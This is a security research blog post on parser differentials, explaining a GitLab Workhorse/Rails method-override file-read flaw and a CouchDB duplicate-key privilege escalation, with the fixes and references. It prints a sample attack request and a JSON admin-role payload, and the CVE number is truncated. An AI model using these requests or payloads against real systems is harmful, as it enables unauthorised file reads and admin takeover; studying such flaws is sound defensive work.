---
title: How to Exploit Parser Differentials
date: 2024-01-15
categories:
  - Security Research
  - Parser Differential
---

## Definition

Parser differentials emerge when two (or more) parsers interpret the same input in different ways. The term originates from the [Language-theoretic Security approach](http://langsec.org).

> Different interpretation of messages or data streams by components breaks any assumptions that components adhere to a shared specification and so introduces inconsistent state and unanticipated computation.

## GitLab File Upload Vulnerability (CVE-2020-）

### File Uploads in GitLab

To understand the file upload vulnerability we need to look at the involved components:

1. **GitLab Workhorse** - GitLab's reverse proxy that handles file uploads
2. **GitLab Rails** - The Ruby on Rails backend

### How It Works

GitLab Workhorse receives file uploads and rewrites the request to pass the file path to GitLab Rails:

```http
PUT /api/v4/packages/conan/v1/files/Hello/0.1/root+xxxxx/beta/0/export/conanfile.py
```

GitLab Workhorse modifies this to include file path information:
```json
{
  "key": "file.path",
  "value": "/var/opt/gitlab/gitlab-rails/shared/packages/tmp/uploads/582573467"
}
```

### The Parser Differential

**GitLab Workhorse** sees: `POST` or `PUT` request

**GitLab Rails** can be tricked into seeing: A different method due to `Rack::MethodOverride`

By using `X-HTTP-Method-Override: PUT` header or `_method=PUT` parameter, attackers could bypass Workhorse routing and directly interact with Rails!

```http
POST /api/v4/packages/conan/v1/files/Hello/0.1/lol+wat/beta/0/export/conanmanifest.txt?file.size=4&file.path=/tmp/test1234
X-HTTP-Method-Override: PUT
```

This allowed reading arbitrary files from the server's filesystem.

### The Fix

GitLab fixed this by [signing requests](https://gitlab.com/gitlab-org/gitlab-workhorse/-/commit/3a34323b104be89e92db49828268f0bfd831e75a) that pass through Workhorse, with signature verification on the Rails side.

## CouchDB RCE (Max Justicz)

CouchDB uses Erlang for document storage but allows JavaScript for validation:

**Erlang (jiffy):**
```erlang
jiffy:decode("{\"foo\":\"bar\", \"foo\":\"baz\"}")
% Returns: {[{<<"foo">>,<<"bar">>},{<<"foo">>,<<"baz">>}]}
```

**JavaScript:**
```javascript
JSON.parse("{\"foo\":\"bar\", \"foo\": \"baz\"}")
% Returns: {foo: "baz"}
```

### Payload for Admin Access
```json
{
  "type": "user",
  "name": "oops",
  "roles": ["admin"],
  "roles": [],
  "password": "password"
}
```

Erlang sees `["admin"]` while JavaScript sees `[]`.

## HTTP Desync Attacks

The [HTTP desync attack technique](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) is another form of parser differential where front-end and back-end proxies parse HTTP requests differently.

## Why This Matters

The rise of microservices leads to complex environments where the same HTTP request might be interpreted by several different services in different ways - often with security implications.

## References

- [How to exploit parser differentials](https://about.gitlab.com/blog/how-to-exploit-parser-differentials/)
- [CouchDB RCE](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html)
- [HTTP Desync Attacks](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)
